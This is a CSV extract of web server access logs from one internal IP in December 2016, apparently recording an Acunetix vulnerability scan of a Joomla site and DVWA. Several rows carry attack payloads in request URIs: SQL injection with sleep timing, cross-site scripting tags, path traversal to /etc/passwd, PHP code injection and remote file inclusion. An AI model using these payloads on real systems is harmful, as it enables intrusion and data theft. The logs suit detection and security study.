,Address,Time stamp,Method,URI,status code,User agent
3947,192.168.4.25,[22/Dec/2016:16:36:15,GET,/index.php/component/search/?ordering=popular&searchphrase=all&searchword={{9999410*9999368}},200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3948,192.168.4.25,[22/Dec/2016:16:26:33,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3949,192.168.4.25,[22/Dec/2016:16:29:37,GET,/index.php/component/search/?searchword=&ordering=category&searchphrase=allacxScRiPtkzsyScRiPt,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3950,192.168.4.25,[22/Dec/2016:16:28:50,GET,/index.php/component/search/?searchword=the&ordering=newest&searchphrase=exact&areas[0]=content,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3951,192.168.4.25,[22/Dec/2016:16:26:06,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3952,192.168.4.25,[22/Dec/2016:16:20:10,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3953,192.168.4.25,[22/Dec/2016:16:34:56,GET,/index.php/component/search/?ordering=popular&searchphrase[$acunetix]=1&searchword=,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3954,192.168.4.25,[22/Dec/2016:16:25:01,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3955,192.168.4.25,[22/Dec/2016:16:32:44,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3956,192.168.4.25,[22/Dec/2016:16:23:28,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3957,192.168.4.25,[22/Dec/2016:16:19:10,GET,/index.php/component/content/'%2bresponse.write(9676140*9552316)%2b'/2-uncategorised,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3958,192.168.4.25,[22/Dec/2016:16:29:23,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3959,192.168.4.25,[22/Dec/2016:16:30:41,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3960,192.168.4.25,[22/Dec/2016:16:38:49,POST,/index.php/component/users/?task=registration.register,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3961,192.168.4.25,[22/Dec/2016:16:28:36,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3962,192.168.4.25,[22/Dec/2016:16:25:41,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3963,192.168.4.25,[22/Dec/2016:16:31:10,GET,/index.php/component/invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././,400.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3964,192.168.4.25,[22/Dec/2016:16:22:10,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3965,192.168.4.25,[22/Dec/2016:16:23:51,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3966,192.168.4.25,[22/Dec/2016:16:20:34,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3967,192.168.4.25,[22/Dec/2016:16:34:23,GET,"/index.php/component/search/?ordering=oldest&searchphrase=all&searchword=if(now()=sysdate()%2csleep(3)%2c0)/*'XOR(if(now()=sysdate()%2csleep(3)%2c0))OR'\""XOR(if(now()=sysdate()%2csleep(3)%2c0))OR\""*/",200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3968,192.168.4.25,[22/Dec/2016:16:20:53,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3969,192.168.4.25,[22/Dec/2016:16:32:57,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3970,192.168.4.25,[22/Dec/2016:16:27:42,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3971,192.168.4.25,[22/Dec/2016:16:22:57,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3972,192.168.4.25,[22/Dec/2016:16:24:37,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3973,192.168.4.25,[22/Dec/2016:16:30:53,POST,/DVWA/login.php,302.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3974,192.168.4.25,[22/Dec/2016:16:29:00,GET,/index.php/component/search/?searchword=ul.menu&ordering=acxScRiPtkzsyScRiPt&searchphrase=all,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3975,192.168.4.25,[22/Dec/2016:16:18:54,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3976,192.168.4.25,[22/Dec/2016:16:31:00,GET,/index.php/HvWHLLCJ/search/,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3977,192.168.4.25,[22/Dec/2016:16:37:25,GET,"/DVWA/security.php?phpids='\""",302.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3978,192.168.4.25,[22/Dec/2016:16:20:54,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3979,192.168.4.25,[22/Dec/2016:16:28:00,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3980,192.168.4.25,[22/Dec/2016:16:19:30,GET,"/index.php/component/content/category/2-%f0''%f0\""\""",404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3981,192.168.4.25,[22/Dec/2016:16:20:06,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3982,192.168.4.25,[22/Dec/2016:16:18:20,GET,/templates/beez_20/javascript/hide.js,200.0,
3983,192.168.4.25,[22/Dec/2016:16:18:44,POST,/index.php,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3984,192.168.4.25,[22/Dec/2016:16:20:35,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3985,192.168.4.25,[22/Dec/2016:16:39:27,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3986,192.168.4.25,[22/Dec/2016:16:29:32,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3987,192.168.4.25,[22/Dec/2016:16:23:08,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3988,192.168.4.25,[22/Dec/2016:16:40:15,GET,/index.php/component/content/article/2-uncategorised/%5e(%23%24!%40%23%24)(()))******-testsayfasi,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3989,192.168.4.25,[22/Dec/2016:16:35:28,GET,/index.php/component/search/?ordering=popular&searchphrase=any&searchword=-1%20OR%202%2b124-124-1=0%2b0%2b0%2b1%20--%20,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3990,192.168.4.25,[22/Dec/2016:16:18:30,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3991,192.168.4.25,[22/Dec/2016:16:36:07,GET,/index.php/component/search/?ordering=oldest&searchphrase=all&searchword=acu4836%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca4836,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3992,192.168.4.25,[22/Dec/2016:16:26:47,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3993,192.168.4.25,[22/Dec/2016:16:18:09,GET,/DVWA/vulnerabilities/view_source_all.php,302.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3994,192.168.4.25,[22/Dec/2016:16:24:14,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3995,192.168.4.25,[22/Dec/2016:16:29:28,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3996,192.168.4.25,[22/Dec/2016:16:36:23,GET,/index.php/component/search/?ordering=newest&searchphrase=any&searchword=%5c,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3997,192.168.4.25,[22/Dec/2016:16:19:26,GET,/../../../../../../../../../../etc/passwd/2-uncategorised/1-testsayfasi,400.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3998,192.168.4.25,[22/Dec/2016:16:34:00,POST,/index.php,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
3999,192.168.4.25,[22/Dec/2016:16:37:12,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4000,192.168.4.25,[22/Dec/2016:16:19:52,GET,"/index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20'\""()%26%25<acx><ScRiPt%20>pnMW(9281)</ScRiPt>&tmpl=component",200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4001,192.168.4.25,[22/Dec/2016:16:32:20,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4002,192.168.4.25,[22/Dec/2016:16:21:54,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4003,192.168.4.25,[22/Dec/2016:16:23:46,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4004,192.168.4.25,[22/Dec/2016:16:35:51,GET,"/index.php/component/search/?ordering=popular&searchphrase='\""&searchword=",200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4005,192.168.4.25,[22/Dec/2016:16:30:56,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4006,192.168.4.25,[22/Dec/2016:16:26:15,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4007,192.168.4.25,[22/Dec/2016:16:19:18,GET,/index.php/http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/content/category/2-uncategorised,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4008,192.168.4.25,[22/Dec/2016:16:37:46,POST,/index.php/component/users/?task=user.login,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4009,192.168.4.25,[22/Dec/2016:16:30:02,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4010,192.168.4.25,[22/Dec/2016:16:32:07,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4011,192.168.4.25,[22/Dec/2016:16:31:26,POST,/index.php,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4012,192.168.4.25,[22/Dec/2016:16:18:28,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4013,192.168.4.25,[22/Dec/2016:16:27:23,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4014,192.168.4.25,[22/Dec/2016:16:25:42,POST,/index.php/component/search/,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4015,192.168.4.25,[22/Dec/2016:16:30:57,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4016,192.168.4.25,[22/Dec/2016:16:27:06,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4017,192.168.4.25,[22/Dec/2016:16:24:28,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4018,192.168.4.25,[22/Dec/2016:16:25:42,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4019,192.168.4.25,[22/Dec/2016:16:21:10,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4020,192.168.4.25,[22/Dec/2016:16:29:57,POST,/administrator/index.php,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4021,192.168.4.25,[22/Dec/2016:16:40:15,GET,"/index.php/component/content/-1\""%20OR%202%2b862-862-1=0%2b0%2b0%2b1%20--%20/2-uncategorised/1-testsayfasi",500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4022,192.168.4.25,[22/Dec/2016:16:38:19,POST,/index.php/component/users/?task=user.login,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4023,192.168.4.25,[22/Dec/2016:16:24:03,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4024,192.168.4.25,[22/Dec/2016:16:27:10,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4025,192.168.4.25,[22/Dec/2016:16:22:26,POST,/index.php/component/search/,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4026,192.168.4.25,[22/Dec/2016:16:27:47,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4027,192.168.4.25,[22/Dec/2016:16:22:33,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4028,192.168.4.25,[22/Dec/2016:16:29:09,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4029,192.168.4.25,[22/Dec/2016:16:18:58,POST,/index.php,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4030,192.168.4.25,[22/Dec/2016:16:37:37,POST,/index.php/component/users/?task=user.login,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4031,192.168.4.25,[22/Dec/2016:16:33:53,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4032,192.168.4.25,[22/Dec/2016:16:22:17,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4033,192.168.4.25,[22/Dec/2016:16:19:42,GET,/index.php/component/mailto/?link=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&template=beez_20&tmpl=component,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4034,192.168.4.25,[22/Dec/2016:16:19:07,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4035,192.168.4.25,[22/Dec/2016:16:32:12,POST,/index.php,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4036,192.168.4.25,[22/Dec/2016:16:21:04,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4037,192.168.4.25,[22/Dec/2016:16:22:39,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4038,192.168.4.25,[22/Dec/2016:16:27:49,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4039,192.168.4.25,[22/Dec/2016:16:25:19,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4040,192.168.4.25,[22/Dec/2016:16:26:23,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4041,192.168.4.25,[22/Dec/2016:16:28:22,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4042,192.168.4.25,[22/Dec/2016:16:19:02,GET,/index.php/component/content/?format=feed&type=atom&view=featured%26n954526=v987369,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4043,192.168.4.25,[22/Dec/2016:16:23:08,POST,/index.php/component/search/,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4044,192.168.4.25,[22/Dec/2016:16:27:04,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4045,192.168.4.25,[22/Dec/2016:16:27:31,POST,/index.php/component/search/,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4046,192.168.4.25,[22/Dec/2016:16:23:23,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4047,192.168.4.25,[22/Dec/2016:16:18:09,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4048,192.168.4.25,[22/Dec/2016:16:18:55,GET,/DVWA/instructions.php?doc=JyI=,302.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4049,192.168.4.25,[22/Dec/2016:16:24:29,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4050,192.168.4.25,[22/Dec/2016:16:26:17,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4051,192.168.4.25,[22/Dec/2016:16:21:58,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4052,192.168.4.25,[22/Dec/2016:16:35:47,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4053,192.168.4.25,[22/Dec/2016:16:21:46,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4054,192.168.4.25,[22/Dec/2016:16:28:45,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4055,192.168.4.25,[22/Dec/2016:16:18:20,GET,/media/system/js/caption.js,200.0,
4056,192.168.4.25,[22/Dec/2016:16:29:43,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4057,192.168.4.25,[22/Dec/2016:16:38:52,POST,/index.php/component/users/?task=WEB-INF%5cweb.xml,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4058,192.168.4.25,[22/Dec/2016:16:28:57,POST,/administrator/index.php,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4059,192.168.4.25,[22/Dec/2016:16:29:55,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4060,192.168.4.25,[22/Dec/2016:16:21:20,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4061,192.168.4.25,[22/Dec/2016:16:22:59,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4062,192.168.4.25,[22/Dec/2016:16:32:24,POST,/administrator/index.php,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4063,192.168.4.25,[22/Dec/2016:16:26:01,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4064,192.168.4.25,[22/Dec/2016:16:29:59,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4065,192.168.4.25,[22/Dec/2016:16:30:17,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4066,192.168.4.25,[22/Dec/2016:16:26:31,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4067,192.168.4.25,[22/Dec/2016:16:30:56,POST,/DVWA/login.php,302.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4068,192.168.4.25,[22/Dec/2016:16:29:23,GET,/index.php/component/search/?searchword=&ordering=popular&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=newsfeeds,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4069,192.168.4.25,[22/Dec/2016:16:40:16,GET,/index.php/component/content/';print(md5(acunetix_wvs_security_test));%24a='/2-uncategorised/1-testsayfasi,500.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4070,192.168.4.25,[22/Dec/2016:16:21:46,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4071,192.168.4.25,[22/Dec/2016:16:18:07,GET,/DVWA/dvwa,301.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4072,192.168.4.25,[22/Dec/2016:16:40:10,GET,/index.php/component/content//../..//../..//../..//../..//../..//etc/passwd%00.jpg/2-uncategorised/1-testsayfasi,404.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4073,192.168.4.25,[22/Dec/2016:16:37:35,POST,/index.php/component/users/?task=user.login,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4074,192.168.4.25,[22/Dec/2016:16:31:00,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4075,192.168.4.25,[22/Dec/2016:16:20:57,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4076,192.168.4.25,[22/Dec/2016:16:26:07,POST,/index.php/component/search/,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4077,192.168.4.25,[22/Dec/2016:16:24:43,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4078,192.168.4.25,[22/Dec/2016:16:36:05,GET,"/DVWA/vulnerabilities/fi?page=\"";print(md5(acunetix_wvs_security_test));%24a=\""",301.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4079,192.168.4.25,[22/Dec/2016:16:33:10,GET,"/index.php/component/search/?searchword=ul.menu\""onmouseover=kzsy(9868)\""&ordering=popular&searchphrase=all",200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4080,192.168.4.25,[22/Dec/2016:16:26:41,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4081,192.168.4.25,[22/Dec/2016:16:18:34,POST,/index.php,200.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
4082,192.168.4.25,[22/Dec/2016:16:28:19,POST,/index.php/component/search/,303.0,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML
